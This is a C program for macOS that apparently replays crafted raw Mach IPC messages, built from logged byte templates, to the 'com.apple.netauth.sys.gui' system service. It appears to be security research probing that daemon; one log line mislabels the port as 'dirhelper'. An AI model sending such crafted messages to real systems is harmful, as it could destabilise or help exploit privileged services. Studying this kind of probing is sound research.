
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static void write_u32_le(uint8_t *buf, uint32_t v) {
    buf[0] = v & 0xff;
    buf[1] = (v >> 8) & 0xff;
    buf[2] = (v >> 16) & 0xff;
    buf[3] = (v >> 24) & 0xff;
}

static uint32_t read_u32_le(const uint8_t *buf) {
    return ((uint32_t)buf[0]) | ((uint32_t)buf[1] << 8) |
           ((uint32_t)buf[2] << 16) | ((uint32_t)buf[3] << 24);
}

mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    // Allocate a port with receive rights
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate port: %s\n", mach_error_string(kr));
        exit(1);
    }

    // Insert a send right for the port
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to insert send right: %s\n", mach_error_string(kr));
        exit(1);
    }

    return port; // Return the port with send rights
}

// ---------------- Templates from your logs ----------------


uint8_t msg1[] = {
    // Header (24 bytes)
    0x7c, 0x54, 0xbd, 0x52,  0x30, 0x00, 0x00, 0x00,
    0x88, 0x34, 0x02, 0x90,  0x16, 0xf8, 0x78, 0x79,
    0xe2, 0xb5, 0xb0, 0x3a,  0x94, 0xfb, 0x03, 0x00,
    // Body (76 bytes)
    0xc9, 0xe1, 0x71, 0x23,  0x53, 0xaa, 0xbc, 0x6c,
    0x05, 0xa1, 0x2b, 0x54,  0x01, 0x06, 0x0f, 0xcd,
    0x0f, 0x3a, 0xeb, 0xb0,  0x3d, 0xbc, 0x1d, 0x05,
    0x00, 0x00, 0x00, 0x00,  0xb3, 0xe2, 0x95, 0x30,
    0xfe, 0x69, 0xec, 0x3b,  0xa2, 0xa0, 0x34, 0x53,
    0x15, 0x09, 0x77, 0x6c,  0xa9, 0xf5, 0x24, 0x69,
    0x08, 0x4d, 0x66, 0x09,  0x6c, 0x21, 0x16, 0x22,
    0xbc, 0x21, 0x0b, 0x00,  0xfc, 0xb0, 0xa0, 0x13,
    0xd1, 0x63, 0x56, 0x79,  0x21, 0xe1, 0x9b, 0x89,
    0x89, 0xe2, 0xb7, 0x81
};


uint8_t msg2[] = {
    // Header (24 bytes)
    0x38, 0x00, 0x00, 0x80,  0x48, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x00, 0xff,  0xd9, 0xcd, 0x04, 0x00,
    0xa3, 0x86, 0x01, 0x00,  0x8f, 0xfb, 0x03, 0x00,
    // Body (100 bytes)
    0x01, 0x00, 0x00, 0x00,  0x00, 0xc8, 0x80, 0x26,
    0x01, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x01,
    0x76, 0x09, 0x00, 0x00,  0x11, 0x75, 0x74, 0x00,
    0x00, 0x00, 0x01, 0x00,  0x00, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x01, 0x2d,  0x0f, 0x69, 0x50, 0x00,
    0x00, 0x00, 0x00, 0x00,  0x76, 0x09, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,  0x34, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0x0f,  0x00, 0x00, 0x74, 0x75,
    0x00, 0x00, 0x01, 0x00,  0x00, 0x11, 0x75, 0x74,
    0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, 0x01,
    0x00, 0x00, 0x00, 0x01,  0x00, 0x0f, 0x69, 0x50,
    0x00, 0x00, 0x00, 0x00,  0x00, 0x01, 0x0e, 0x0f,
    0xff, 0xff, 0xff, 0xff
};



typedef struct {
    const uint8_t *data;
    size_t len;
    const char *name;
} msgdef;

msgdef msgs[] = {
    { msg1, sizeof(msg1), "msg1" },
    { msg2, sizeof(msg2), "msg2" }   
};

int main(int argc, char **argv) 
{
    int strict = 0;   

    kern_return_t kr;
    mach_port_t bp, dest;
    // mach_port_t reply_port;
    // mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    // mach_port_insert_right(mach_task_self(), reply_port, reply_port, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    kr = task_get_bootstrap_port(mach_task_self(), &bp);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get bootstrap port, error: %s\n", mach_error_string(kr));
        return 1;
    }

    kr = bootstrap_look_up(bp, "com.apple.netauth.sys.gui", &dest);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "bootstrap lookup failed: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("[+] dirhelper port = 0x%x (%u)\n", dest, dest);
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    size_t count = 2;

    for (size_t i = 1; i < count; i++) {
        size_t len = msgs[i].len;
        uint8_t *buf = malloc(len);
        memcpy(buf, msgs[i].data, len);

        if (strict) {
            write_u32_le(buf + 4, (uint32_t)len); // patch size
        }
        write_u32_le(buf + 0, (uint32_t)MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_PORT_NULL));
        write_u32_le(buf + 12, (uint32_t)send_right_port); // patch local port
        write_u32_le(buf + 16, (uint32_t)MACH_PORT_NULL); // patch voucher port
        
        write_u32_le(buf + 8, (uint32_t)dest);     // patch remote port

        uint32_t msgid = read_u32_le(buf + 20);
        uint32_t msgh_bits = read_u32_le(buf + 0);
    
        uint32_t msg_size = read_u32_le(buf + 4);
        uint32_t msg_remote_port = read_u32_le(buf + 8);
        uint32_t msg_local_port = read_u32_le(buf + 12);
        uint32_t msg_voucher_port = read_u32_le(buf + 16);

        printf("Sending the following mach msg:\n");
        printf("------ MACH MSG HEADER ------\n");
        printf("msg_bits: %u\n", msgh_bits);
        printf("msg_size: %u\n", msg_size);
        printf("msg_remote_port: %u\n", msg_remote_port);
        printf("msg_local_port: %u\n", msg_local_port);
        printf("msg_voucher_port: %u\n", msg_voucher_port);
        printf("msg_id: %u\n", msgid);
        printf("------ MACH MSG HEADER IN BYTES ------\n");
        for (size_t j = 0; j < 24; j++) {
            printf("0x%02x", buf[j]);
            if (j % 4 == 3) printf("  ");
            else printf(" ");
        }
        printf("\n");

        size_t body_len = (len > 24) ? (len - 24) : 0;
        printf("------ MACH MSG BODY IN BYTES (%zu bytes) ------\n", body_len);
        for (size_t j = 24; j < 24 + body_len; j++) {
            printf("0x%02x", buf[j]);
            if ((j - 24) % 4 == 3) printf("  ");
            else printf(" ");
        }
        printf("\n");
     
       
        mach_msg_return_t ret = mach_msg((mach_msg_header_t *)buf,
                                        MACH_SEND_MSG,
                                        (mach_msg_size_t)msg_size,
                                        0,
                                        send_right_port,
                                        MACH_MSG_TIMEOUT_NONE,
                                        MACH_PORT_NULL);
     

        if (ret != MACH_MSG_SUCCESS) {
            printf("  [-] mach_msg failed: %s (0x%x)\n", mach_error_string(ret), ret);
        } else {
            printf("  [+] sent\n");
        }      

        free(buf);
    }

    return 0;
}
